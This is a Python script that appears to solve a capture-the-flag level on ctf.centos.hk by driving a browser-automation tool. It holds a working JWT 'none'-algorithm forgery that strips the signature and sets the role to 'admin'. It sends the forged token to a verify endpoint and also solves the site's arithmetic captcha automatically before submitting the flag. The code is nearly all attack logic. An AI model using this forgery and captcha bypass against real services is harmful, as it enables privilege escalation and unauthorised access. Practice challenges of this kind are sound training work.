import argparse
import base64
import json
import os
import re
import shutil
import subprocess
import sys


DEFAULT_LEVEL_PATH = "/api/levels/10"
DEFAULT_VERIFY_PATH = "/api/levels/10/verify-token"
DEFAULT_ANSWER_PATH = "/api/levels/10/answer"
DEFAULT_CAPTCHA_PATH = "/api/captcha"


def resolve_agent_browser() -> str:
    env_value = os.environ.get("AGENT_BROWSER_BIN")
    if env_value:
        return env_value

    exe_candidate = os.path.expandvars(
        r"%APPDATA%\npm\node_modules\agent-browser\bin\agent-browser-win32-x64.exe"
    )
    if os.path.exists(exe_candidate):
        return exe_candidate

    for candidate in ("agent-browser", "agent-browser.ps1", "agent-browser.cmd"):
        resolved = shutil.which(candidate)
        if resolved:
            return resolved

    raise FileNotFoundError("agent-browser executable not found")


def run_agent(*args: str) -> str:
    result = subprocess.run(
        [resolve_agent_browser(), *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"agent-browser failed ({result.returncode})\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
        )
    return result.stdout.strip()


def list_tabs() -> str:
    return run_agent("tab", "list")


def find_ctf_tab() -> int | None:
    output = list_tabs()
    candidates: list[int] = []
    for line in output.splitlines():
        line = line.strip()
        if not (line.startswith("[") or line.startswith("→ [")):
            continue
        if "https://ctf.centos.hk/" not in line:
            continue

        start = line.find("[")
        end = line.find("]", start + 1)
        if start == -1 or end == -1:
            continue
        candidates.append(int(line[start + 1 : end]))
    return candidates[-1] if candidates else None


def switch_tab(tab: int | None) -> None:
    target = tab if tab is not None else find_ctf_tab()
    if target is not None:
        run_agent("tab", str(target))


def browser_eval(js: str) -> str:
    return run_agent("eval", js)


def browser_fetch_json(path: str, method: str = "GET", body: dict | None = None) -> dict:
    body_json = json.dumps(body, ensure_ascii=False) if body is not None else None
    js = (
        "(async()=>{"
        f"const options={{method:{json.dumps(method)},headers:{{'Content-Type':'application/json'}}"
        + (f",body:JSON.stringify({body_json})" if body_json is not None else "")
        + "};"
        f"const response=await fetch({json.dumps(path)},options);"
        "return JSON.stringify(await response.json());"
        "})()"
    )
    raw = browser_eval(js)
    parsed = json.loads(raw)
    if isinstance(parsed, str):
        parsed = json.loads(parsed)
    return parsed


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def solve_captcha(question: str) -> int:
    match = re.search(r"(-?\d+)\s*([+\-*/xX])\s*(-?\d+)", question)
    if not match:
        raise ValueError(f"unsupported captcha: {question}")

    left = int(match.group(1))
    operator = match.group(2)
    right = int(match.group(3))

    if operator == "+":
        return left + right
    if operator == "-":
        return left - right
    if operator in ("*", "x", "X"):
        return left * right
    if operator == "/":
        return left // right
    raise ValueError(f"unsupported captcha operator: {question}")


def normalize_flag(value: str) -> str:
    text = value.strip()
    match = re.fullmatch(r"muyuan\{(.+)\}", text)
    return match.group(1) if match else text


def fetch_level(level_path: str) -> dict:
    return browser_fetch_json(level_path)


def decode_jwt_without_verification(token: str) -> tuple[dict, dict]:
    header_b64, payload_b64, _signature = token.split(".")
    decode = lambda part: json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))
    return decode(header_b64), decode(payload_b64)


def forge_none_token(original_token: str) -> str:
    _header, payload = decode_jwt_without_verification(original_token)
    forged_header = {"alg": "none", "typ": "JWT"}
    forged_payload = dict(payload)
    forged_payload["role"] = "admin"
    return (
        f"{b64url_encode(json.dumps(forged_header, separators=(',', ':')).encode('utf-8'))}."
        f"{b64url_encode(json.dumps(forged_payload, separators=(',', ':')).encode('utf-8'))}."
    )


def verify_token(verify_path: str, token: str) -> dict:
    return browser_fetch_json(verify_path, method="POST", body={"token": token})


def submit_answer(flag: str, captcha_path: str, answer_path: str) -> dict:
    captcha = browser_fetch_json(captcha_path)
    captcha_answer = solve_captcha(captcha["question"])
    return browser_fetch_json(
        answer_path,
        method="POST",
        body={
            "answer": f"muyuan{{{normalize_flag(flag)}}}",
            "captchaId": captcha["id"],
            "captchaAnswer": captcha_answer,
        },
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Level 10 JWT none-alg exploit helper")
    parser.add_argument("--tab", type=int)
    parser.add_argument("--level-path", default=DEFAULT_LEVEL_PATH)
    parser.add_argument("--verify-path", default=DEFAULT_VERIFY_PATH)
    parser.add_argument("--answer-path", default=DEFAULT_ANSWER_PATH)
    parser.add_argument("--captcha-path", default=DEFAULT_CAPTCHA_PATH)
    parser.add_argument("--submit-level-answer", action="store_true")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    switch_tab(args.tab)

    level_data = fetch_level(args.level_path)
    original_token = level_data["challenge"]["data"]["yourToken"]
    forged_token = forge_none_token(original_token)
    verification = verify_token(args.verify_path, forged_token)

    output: dict = {
        "originalToken": original_token,
        "forgedToken": forged_token,
        "verification": verification,
    }

    flag = verification.get("flag")
    if args.submit_level_answer and flag:
        output["levelSubmit"] = submit_answer(flag, args.captcha_path, args.answer_path)

    print(json.dumps(output, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
